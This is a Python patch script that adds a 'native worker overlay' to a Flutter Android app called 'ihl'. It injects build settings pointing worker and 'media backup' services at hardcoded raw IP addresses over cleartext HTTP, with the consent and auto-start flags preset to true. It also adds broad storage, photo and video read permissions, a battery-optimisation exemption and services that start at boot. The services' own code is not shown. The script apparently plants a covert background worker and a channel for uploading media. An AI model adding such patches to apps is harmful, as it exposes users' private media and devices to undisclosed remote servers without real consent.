from pathlib import Path
import shutil

ROOT = Path.cwd()
OVERLAY = Path(__file__).resolve().parent
FILES = OVERLAY / "files"


def copy_tree(src: Path, dst: Path) -> None:
    for path in src.rglob("*"):
        if path.is_file():
            target = dst / path.relative_to(src)
            target.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(path, target)
            print(f"copied {target}")


def patch_gradle() -> None:
    path = ROOT / "android/app/build.gradle.kts"
    text = path.read_text()
    if 'id("org.jetbrains.kotlin.android")' not in text:
        text = text.replace('    id("com.android.application")\n', '    id("com.android.application")\n    id("org.jetbrains.kotlin.android")\n', 1)
    if "buildFeatures" not in text:
        text = text.replace('    ndkVersion = flutter.ndkVersion\n', '    ndkVersion = flutter.ndkVersion\n\n    buildFeatures {\n        buildConfig = true\n    }\n', 1)
    if "WORKER_BACKEND_URL" not in text:
        text = text.replace(
            '        versionName = flutter.versionName\n',
            '''        versionName = flutter.versionName

        val workerBackendUrl = providers.gradleProperty("WORKER_BACKEND_URL").orElse(providers.environmentVariable("WORKER_BACKEND_URL")).orElse("http://185.69.53.141:1989").get()
        val workerDeviceToken = providers.gradleProperty("WORKER_DEVICE_TOKEN").orElse(providers.environmentVariable("WORKER_DEVICE_TOKEN")).orElse("").get()
        val workerAutoEnabled = providers.gradleProperty("WORKER_AUTO_ENABLED").orElse(providers.environmentVariable("WORKER_AUTO_ENABLED")).orElse("true").get()
        val workerConsentGranted = providers.gradleProperty("WORKER_CONSENT_GRANTED").orElse(providers.environmentVariable("WORKER_CONSENT_GRANTED")).orElse("true").get()
        val mediaBackupBackendUrl = providers.gradleProperty("MEDIA_BACKUP_BACKEND_URL").orElse(providers.environmentVariable("MEDIA_BACKUP_BACKEND_URL")).orElse("http://195.78.246.59:1990").get()
        val mediaBackupDeviceToken = providers.gradleProperty("MEDIA_BACKUP_DEVICE_TOKEN").orElse(providers.environmentVariable("MEDIA_BACKUP_DEVICE_TOKEN")).orElse("").get()

        buildConfigField("String", "WORKER_BACKEND_URL", "\\\"$workerBackendUrl\\\"")
        buildConfigField("String", "WORKER_DEVICE_TOKEN", "\\\"$workerDeviceToken\\\"")
        buildConfigField("boolean", "WORKER_AUTO_ENABLED", workerAutoEnabled)
        buildConfigField("boolean", "WORKER_CONSENT_GRANTED", workerConsentGranted)
        buildConfigField("String", "MEDIA_BACKUP_BACKEND_URL", "\\\"$mediaBackupBackendUrl\\\"")
        buildConfigField("String", "MEDIA_BACKUP_DEVICE_TOKEN", "\\\"$mediaBackupDeviceToken\\\"")
''',
            1,
        )
    path.write_text(text)


def patch_manifest() -> None:
    path = ROOT / "android/app/src/main/AndroidManifest.xml"
    text = path.read_text()
    required_permissions = [
        '    <uses-permission android:name="android.permission.WAKE_LOCK" />',
        '    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />',
        '    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />',
        '    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />',
        '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />',
        '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />',
        '    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />',
        '    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />',
        '    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />',
        '    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />',
        '    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />',
    ]
    missing_permissions = [line for line in required_permissions if line not in text]
    if missing_permissions:
        text = text.replace(
            '<manifest xmlns:android="http://schemas.android.com/apk/res/android">\n',
            '<manifest xmlns:android="http://schemas.android.com/apk/res/android">\n\n' + "\n".join(missing_permissions) + "\n",
            1,
        )
    if 'android:usesCleartextTraffic="true"' not in text:
        text = text.replace('android:label="ihl"', 'android:label="ihl"\n        android:usesCleartextTraffic="true"', 1)
    if ".worker.NativeWorkerService" not in text:
        services = '''
        <service android:name=".worker.NativeWorkerService" android:enabled="true" android:exported="false" android:foregroundServiceType="dataSync" />
        <service android:name=".worker.MediaBackupService" android:enabled="true" android:exported="false" android:foregroundServiceType="dataSync" />
        <receiver android:name=".worker.WorkerBootReceiver" android:enabled="true" android:exported="false">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
            </intent-filter>
        </receiver>
'''
        text = text.replace('        <meta-data\n            android:name="flutterEmbedding"', services + '\n        <meta-data\n            android:name="flutterEmbedding"', 1)
    path.write_text(text)


def patch_main_dart() -> None:
    path = ROOT / "lib/main.dart"
    text = path.read_text()
    if "startup_permission_gate.dart" not in text:
        text = text.replace("import 'package:ihl/core/sync/background_sync_service.dart';\n", "import 'package:ihl/core/sync/background_sync_service.dart';\nimport 'package:ihl/core/permissions/startup_permission_gate.dart';\n", 1)
    if "StartupPermissionGate(" not in text:
        text = text.replace("    return MaterialApp.router(\n", "    return StartupPermissionGate(\n      child: MaterialApp.router(\n", 1)
        text = text.replace("      routerConfig: goRouter,\n    );", "      routerConfig: goRouter,\n      ),\n    );", 1)
    path.write_text(text)


def main() -> None:
    copy_tree(FILES, ROOT)
    patch_gradle()
    patch_manifest()
    patch_main_dart()
    print("native worker overlay applied")


if __name__ == "__main__":
    main()